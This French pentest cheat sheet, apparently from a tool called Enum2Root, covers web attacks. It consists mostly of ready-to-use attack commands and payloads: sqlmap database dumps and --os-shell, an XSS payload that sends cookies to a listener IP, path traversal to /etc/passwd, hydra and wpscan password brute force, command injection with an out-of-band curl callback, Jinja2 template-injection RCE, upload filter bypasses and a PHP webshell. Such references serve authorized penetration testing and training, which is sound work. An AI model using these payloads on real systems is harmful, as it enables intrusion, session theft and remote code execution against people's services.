# 2 - Attaques web

Cette page couvre les vulnérabilités web classiques rencontrées en pentest : injection SQL, XSS, inclusion de fichiers, brute force de formulaires, WordPress, injection de commandes, SSTI et upload de fichiers. Chaque section reprend les commandes exactes d'Enum2Root et renvoie vers des références vérifiées (HackTricks, PayloadsAllTheThings, PortSwigger Web Security Academy, OWASP).

!!! note "Jetons"
    Les commandes utilisent des jetons à substituer par vos valeurs :

    - `{URL}` - URL de base de l'application (ex. `http://target.tld`)
    - `{IP}` - adresse IP de la cible
    - `{USER}` - nom d'utilisateur
    - `{PASS}` - mot de passe
    - `<listener_ip>` - IP de votre machine d'attaque (callback / out-of-band)
    - `<path>`, `<params>`, `<fail_string>`, `<size>`, `<CA>`, `<Template>` - valeurs à adapter au contexte

## SQL Injection

Injection SQL (`injection`). Contournement d'authentification classique : `admin'--` ou `' OR '1'='1`.

!!! info "Références"
    - [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
    - [PayloadsAllTheThings - SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
    - [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
    - [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

### Détection / dump (GET)

```bash
sqlmap -u "{URL}/page.php?id=1" --batch --dbs
```

**Voir aussi :** [sqlmap - dépôt officiel](https://github.com/sqlmapproject/sqlmap) · [sqlmap - guide d'utilisation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### Requête POST

```bash
sqlmap -u "{URL}/login.php" --data="username=admin&password=test" --batch --dbs
```

**Voir aussi :** [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Depuis une requête capturée + dump

```bash
sqlmap -r request.txt --batch --dbs --dump
```

**Voir aussi :** [PortSwigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

### RCE (si autorisé)

```bash
sqlmap -r request.txt --batch --os-shell
```

**Voir aussi :** [sqlmap - guide d'utilisation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

## XSS (Cross-Site Scripting)

Cross-Site Scripting (`injection`). Reflected / stored / DOM. Sondez d'abord, puis escaladez vers le vol de cookie ou des actions.

!!! info "Références"
    - [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
    - [PayloadsAllTheThings - XSS Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
    - [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
    - [OWASP - Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)

### Sonde rapide (reflected)

```html
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
```

**Voir aussi :** [PortSwigger - XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### Scan automatisé (dalfox)

```bash
dalfox url "{URL}/search?q=test"
```

**Voir aussi :** [dalfox - dépôt officiel](https://github.com/hahwul/dalfox)

### Vol de cookie (out-of-band)

```html
<script>new Image().src='http://<listener_ip>/c='+document.cookie</script>
```

**Voir aussi :** [PortSwigger - Exploiting cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)

## LFI / Path Traversal

Inclusion de fichiers / traversée de répertoire (`inclusion`). `-mc` filtre par code de réponse, `-fs` filtre par taille.

!!! info "Références"
    - [HackTricks - File Inclusion / Path Traversal](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
    - [PayloadsAllTheThings - File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
    - [PortSwigger - Path traversal](https://portswigger.net/web-security/file-path-traversal)
    - [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

### Fuzz du paramètre

```bash
ffuf -u "{URL}/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>
```

**Voir aussi :** [SecLists - dépôt officiel](https://github.com/danielmiessler/SecLists)

### Fuzz fichiers / wrappers

```bash
ffuf -u "{URL}/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

**Voir aussi :** [PayloadsAllTheThings - File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)

### Lecture directe

```bash
curl "{URL}/index.php?page=../../../../etc/passwd"
```

**Voir aussi :** [PortSwigger - Path traversal](https://portswigger.net/web-security/file-path-traversal)

## Form brute force

Brute force de formulaire (`bruteforce`). Adaptez `<path>`, `<params>` et la `<fail_string>`.

!!! info "Références"
    - [HackTricks - Login Bypass](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html)
    - [PayloadsAllTheThings - Account Takeover](https://swisskyrepo.github.io/PayloadsAllTheThings/Account%20Takeover/)
    - [PortSwigger - Authentication](https://portswigger.net/web-security/authentication)
    - [PortSwigger - Password-based authentication](https://portswigger.net/web-security/authentication/password-based)

### Formulaire POST (hydra)

```bash
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} http-post-form "<path>:<params>:<fail_string>"
```

**Voir aussi :** [SecLists - dépôt officiel](https://github.com/danielmiessler/SecLists)

### Authentification Basic

```bash
hydra -L users.txt -P rockyou.txt {IP} http-get /<path>
```

**Voir aussi :** [PortSwigger - Password-based authentication](https://portswigger.net/web-security/authentication/password-based)

## WordPress

CMS WordPress (`CMS`). Si WordPress est détecté : lancez wpscan en premier.

!!! info "Références"
    - [HackTricks - WordPress](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html)
    - [PayloadsAllTheThings - Account Takeover](https://swisskyrepo.github.io/PayloadsAllTheThings/Account%20Takeover/)
    - [WPScan - site officiel](https://wpscan.com/)

### Énumération (utilisateurs, plugins, thèmes)

```bash
wpscan --url {URL} --enumerate u,ap,at --plugins-detection aggressive
```

**Voir aussi :** [WPScan - dépôt officiel](https://github.com/wpscanteam/wpscan)

### Brute force d'un utilisateur

```bash
wpscan --url {URL} -U admin -P /usr/share/wordlists/rockyou.txt
```

**Voir aussi :** [WPScan - installation](https://github.com/wpscanteam/wpscan#installation)

## Command Injection

Injection de commandes (`injection`). Testez les séparateurs : `;` `|` `&` `&&` nouvelle ligne `$(...)` `` `...` ``.

!!! info "Références"
    - [HackTricks - Command Injection](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
    - [PayloadsAllTheThings - Command Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)
    - [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)
    - [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### Détection (dans un paramètre)

```bash
; id
| id
$(id)
`id`
```

**Voir aussi :** [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)

### Aveugle (temporisation / out-of-band)

```bash
; sleep 5
; curl http://<listener_ip>/$(whoami)
```

**Voir aussi :** [PayloadsAllTheThings - Command Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)

## SSTI (templates)

Server-Side Template Injection (`injection`). Testez `{{7*7}}` : si la page affiche `49`, elle est vulnérable.

!!! info "Références"
    - [HackTricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
    - [PayloadsAllTheThings - Server Side Template Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
    - [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

### Identifier le moteur

```bash
# {{7*7}}=49 -> Jinja2/Twig | ${7*7}=49 -> Freemarker | #{7*7} -> Ruby
```

**Voir aussi :** [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

### RCE Jinja2 (Python)

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Voir aussi :** [PayloadsAllTheThings - Server Side Template Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)

## File upload

Upload de fichiers (`upload`). Contournement des filtres d'extension / content-type.

!!! info "Références"
    - [HackTricks - File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
    - [PayloadsAllTheThings - Upload Insecure Files](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
    - [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
    - [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

### Contournement extension / type

```bash
# shell.php.jpg | shell.pHp | shell.phtml | .php%00.jpg
# Content-Type: image/jpeg + magic bytes GIF89a; au début
```

**Voir aussi :** [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)

### Webshell PHP minimal

```php
echo '<?php system($_GET["c"]); ?>' > shell.php
```

**Voir aussi :** [PayloadsAllTheThings - Upload Insecure Files](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
